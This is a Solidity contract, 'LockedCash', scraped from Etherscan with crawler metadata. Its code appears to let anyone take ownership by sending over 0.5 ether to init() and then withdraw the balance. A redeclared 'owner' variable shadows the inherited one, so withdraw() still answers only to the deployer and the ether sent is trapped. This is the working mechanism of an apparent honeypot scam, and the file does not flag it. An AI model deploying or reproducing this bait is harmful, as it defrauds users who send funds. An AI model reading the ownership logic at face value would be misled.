//token_name	
//token_url	https://etherscan.io//address/0x81edefc64aabdce71f68347774bd4673d1d31419#code
//spider_time	2018/07/08 12:52:32
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.18;

contract Owned {
    address public owner;
    function Owned() { owner = msg.sender; }
    modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
}

contract LockedCash is Owned {
    event CashDeposit(address from, uint amount);
    address public owner = msg.sender;

    function init() payable {
        require(msg.value > 0.5 ether);
        owner = msg.sender;
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        CashDeposit(msg.sender, msg.value);
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}